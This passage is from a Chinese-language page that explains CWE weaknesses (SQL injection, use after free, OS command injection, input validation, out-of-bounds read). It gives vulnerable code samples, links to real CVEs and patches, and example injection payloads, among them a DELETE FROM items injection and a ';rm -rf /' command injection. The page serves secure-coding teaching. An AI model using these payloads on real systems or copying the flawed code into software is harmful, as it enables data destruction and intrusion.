single-quoted-string\">'&lt;bdo dir=\"ltr\">&lt;/bdo>&lt;/td>'</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$current_size = $_COOKIE['pma_fontsize'];\n$current_size = htmlspecialchars($_COOKIE['pma_fontsize']);\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$current_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pma_fontsize'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$current_size</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pma_fontsize'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/89.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQL注入，如果用户可控的输入没有被正确的过滤其中可能包含的SQL语法，那么用这部分输入作为完整SQL命令的一部分时，可能发生预期之外的结果。这可用于更改查询逻辑以绕过安全检查，或插入修改后端数据库的其他语句，包括执行系统命令。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果一个SQL由用户输入拼接而成，最终的大致示意如下，其中<code class=\"x-inline-highlight\">userName</code>是用户名，<code class=\"x-inline-highlight\">itemName</code>由用户输入："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"SELECT * FROM items WHERE owner = &lt;userName> AND itemname = &lt;itemName>;"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"此时如果用户名<code class=\"x-inline-highlight\">wiley</code>输入的<code class=\"x-inline-highlight\">itemName</code>是<code class=\"x-inline-highlight\">name' OR 'a'='a</code>，则拼接后的SQL语句是："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> items <span class=\"token keyword\">WHERE</span> owner <span class=\"token operator\">=</span> <span class=\"token string\">'wiley'</span> <span class=\"token operator\">AND</span> itemname <span class=\"token operator\">=</span> <span class=\"token string\">'name'</span> <span class=\"token operator\">OR</span> <span class=\"token string\">'a'</span><span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这条语句等价于："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM items;"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> items<span class=\"token punctuation\">;</span>"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"还是上面的例子，这次假设用户<code class=\"x-inline-highlight\">wiley</code>输入的<code class=\"x-inline-highlight\">itemName</code>是<code class=\"x-inline-highlight\">name'; DELETE FROM items; --</code>，则SQL语句等价于下面的两个请求："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';\nDELETE FROM items;\n--'\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> items <span class=\"token keyword\">WHERE</span> owner <span class=\"token operator\">=</span> <span class=\"token string\">'wiley'</span> <span class=\"token operator\">AND</span> itemname <span class=\"token operator\">=</span> <span class=\"token string\">'name'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">DELETE</span> <span class=\"token keyword\">FROM</span> items<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">--'</span>\n"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 3"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = $_COOKIE[\"mid\"];\nmysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'\");\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"mid\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT MessageID, Subject FROM messages WHERE MessageID = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"由于cookie是可以在本地修改的，这仍然是一个输入用户可控的例子。注意到PHP语句中的单引号包裹着<code class=\"x-inline-highlight\">$id</code>，一个可以注入的载荷是<code class=\"x-inline-highlight\">1432' or '1' = '1</code>。请求会变成："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> MessageID<span class=\"token punctuation\">,</span> Subject <span class=\"token keyword\">FROM</span> messages <span class=\"token keyword\">WHERE</span> MessageID <span class=\"token operator\">=</span> <span class=\"token string\">'1432'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span>"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2018-1000869\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2018-1000869</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/phpipam/phpipam/issues/2344\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/phpipam/phpipam/issues/2344</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"补丁中加入对参数合法性的检验："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$nat_id   = $_POST['id'];               // nat id\n$nat_type = $_POST['type'];             // src, dst\n\n// validate object type\nif (!in_array($obj_type, ['subnets', 'ipaddresses'])) { $Result->show(\"danger\", _(\"Invalid object type\"), true); }\n\n// validate object id\nif (!is_numeric($obj_id)) { $Result->show(\"danger\", _(\"Invalid object id\"), true); }\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 96px, var(--bg-transparent-green) 96px 216px, transparent 216px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$13"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/416.html","target":"_blank","rel":"noreferrer","children":"【V】CWE-416: Use After Free"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"使用释放过的指针可能会导致未知的行为发生。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"#include <stdio.h>\n#include <unistd.h>\n#define BUFSIZER1 512\n#define BUFSIZER2 ((BUFSIZER1 / 2) - 8)\nint main(int argc, char **argv)\n{\n    char *buf1R1;\n    char *buf2R1;\n    char *buf2R2;\n    char *buf3R2;\n    buf1R1 = (char *)malloc(BUFSIZER1);\n    buf2R1 = (char *)malloc(BUFSIZER1);\n    free(buf2R1);\n    buf2R2 = (char *)malloc(BUFSIZER2);\n    buf3R2 = (char *)malloc(BUFSIZER2);\n    strncpy(buf2R1, argv[1], BUFSIZER1 - 1);\n    free(buf1R1);\n    free(buf2R2);\n    free(buf3R2);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">buf2R1</code>已经被释放过了。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"char *ptr = (char *)malloc(SIZE);\nif (err)\n{\n    abrt = 1;\n    free(ptr);\n}\n...\nif (abrt)\n{\n    logError(\"operation aborted before commit\", ptr);\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$15"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"在发生异常时指针已经释放，但随后又在<code class=\"x-inline-highlight\">logError</code>错误地使用。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2018-1000217\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2018-1000217</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/DaveGamble/cJSON/issues/248\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/DaveGamble/cJSON/issues/248</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果<code class=\"x-inline-highlight\">item</code>的<code class=\"x-inline-highlight\">string</code>属性恰好就是<code class=\"x-inline-highlight\">add_item_to_object</code>的<code class=\"x-inline-highlight\">string</code>参数的地址，且<code class=\"x-inline-highlight\">constant</code>为<code class=\"x-inline-highlight\">false</code>，<code class=\"x-inline-highlight\">cJSON_strdup</code>会在释放后访问这个字符串。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$16"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 72px, var(--bg-transparent-green) 72px 144px, transparent 144px, transparent 264px, var(--bg-transparent-red) 264px 384px, transparent 384px, transparent 432px, var(--bg-transparent-red) 432px 480px, transparent 480px, transparent 480px, var(--bg-transparent-green) 480px 528px, transparent 528px, transparent 600px, var(--bg-transparent-red) 600px 648px, transparent 648px, transparent 648px, var(--bg-transparent-green) 648px 696px, transparent 696px, transparent 792px, var(--bg-transparent-red) 792px 840px, transparent 840px, transparent 840px, var(--bg-transparent-green) 840px 864px, transparent 864px, transparent 912px, var(--bg-transparent-green) 912px 1104px, transparent 1104px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$17"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/78.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"操作系统命令注入，类似地，只不过此时是操作系统命令。通常这有两种子类型："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"程序执行某个固定的程序，但是接收外部输入作为程序的参数。"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"程序将整个输入作为命令重定向到操作系统。"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$userName = $_POST[\"user\"];\n$command = 'ls -l /home/' . $userName;\nsystem($command);\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$userName</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$command</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ls -l /home/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$userName</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果缺乏相应的认证，攻击者可以通过命令分隔符执行攻击命令，例如参数传入<code class=\"x-inline-highlight\">;rm -rf /</code>，命令就等价于："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Bash"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ls -l /home/;rm -rf /"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> /home/<span class=\"token punctuation\">;</span><span class=\"token function\">rm</span> <span class=\"token parameter variable\">-rf</span> /"}}]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2019-1010200\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2019-1010200</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">patch</code>：<a href=\"https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"原本的程序可以通过<code class=\"x-inline-highlight\">req.query.text</code>注入<code class=\"x-inline-highlight\">cmd</code>。补丁对字符串过滤特殊字符，并用<code class=\"x-inline-highlight\">child.stdin.write(sanitizedText)</code>代替<code class=\"x-inline-highlight\">echo</code>命令。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$18"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 96px, var(--bg-transparent-red) 96px 144px, transparent 144px, transparent 144px, var(--bg-transparent-green) 144px 168px, transparent 168px, transparent 192px, var(--bg-transparent-red) 192px 312px, transparent 312px, transparent 312px, var(--bg-transparent-green) 312px 336px, transparent 336px, transparent 528px, var(--bg-transparent-red) 528px 552px, transparent 552px, transparent 552px, var(--bg-transparent-green) 552px 576px, transparent 576px, transparent 792px, var(--bg-transparent-green) 792px 840px, transparent 840px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$19"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/20.html","target":"_blank","rel":"noreferrer","children":"【C】CWE-20: Improper Input Validation"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"输入验证不当，程序接收输入或数据，但没有验证或者错误地验证输入是否具有安全正确地处理数据所需的属性。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"没有输入验证。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$birthday = $_GET['birthday'];\n$homepage = $_GET['homepage'];\necho \"生日：$birthday<br>主页：<a href=$homepage>点击此处</a>\"\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$birthday</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'birthday'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$homepage</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'homepage'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"生日：<span class=\"token interpolation\"><span class=\"token variable\">$birthday</span></span>&lt;br>主页：&lt;a href=<span class=\"token interpolation\"><span class=\"token variable\">$homepage</span></span>>点击此处&lt;/a>\"</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这段程序展示用户的生日和主页，但由于这些参数来自于HTTP请求，攻击者可以构造一个含有<code class=\"x-inline-highlight\">script</code>标签的钓鱼链接，并通过参数传入，导致恶意脚本在客户端上执行。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"尽管开发者可以限制输入为整数和破折号，攻击者仍有可能提供以下形式的字符串："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"2009-01-09--"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"2009-01-09--"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果在SQL语句中使用这些数据，它会将语句的其余部分视为注释。注释可能会禁用语句中其他与安全相关的逻辑。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"XSS攻击或SQL注入只是输入验证不当可能出现的后果中的一小部分。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"有问题的输入验证。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Java"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"private void buildList(int untrustedListSize)\n{\n    if (0 > untrustedListSize)\n    {\n        die(\"Negative value supplied for list size, die evil hacker!\");\n    }\n    Widget[] list = new Widget[untrustedListSize];\n    list[0] = new Widget();\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1a"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这个示例尝试根据用户指定的值构建列表，并判断了提供值为负的情况，但还是忽略了输入<code class=\"x-inline-highlight\">0</code>值的情况，可能导致后续抛出异常。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2008-2223\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2008-2223</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://www.exploit-db.com/exploits/5565\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://www.exploit-db.com/exploits/5565</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"vShare YouTube Clone 2.6中的<code class=\"x-inline-highlight\">group_posts.php</code>中的SQL注入漏洞，远程攻击者可以通过<code class=\"x-inline-highlight\">tid</code>参数执行任意SQL命令。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Perl"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$1b"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 384px, var(--bg-transparent-golden) 384px 408px, transparent 408px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1c"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/125.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-125: Out-of-bounds Read"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"越界读取，在预期缓冲区末尾之后或开头之前读取。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"int getValueFromArray(int *array, int len, int index)\n{\n    int value;\n\n    // check that the array index is less than the maximum\n    // length of the array\n    if (index < len)\n    {\n\n        // get the value at the specified index of the array\n        value = array[index];\n    }\n\n    // if array index is invalid then output error message\n    // and return value indicating error\n    else\n    {\n        printf(\"Value is: %d\\n\", array[index]);\n        value = -1;\n    }\n\n    return value;\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1d"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这段代码只检查了<code class=\"x-inline-highlight\">index &#60; len</code>的情况；在判断条件中还应加入<code class=\"x-inline-highlight\">index &#62;= 0</code>。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2022-1452\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2022-1452</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://huntr.com/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/radareorg/radare2/commit/ecc44b6a2f18ee70ac133365de0e509d26d5e168</a>"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"...\noffset += 6;\nif (attr) {\n    attr->type = 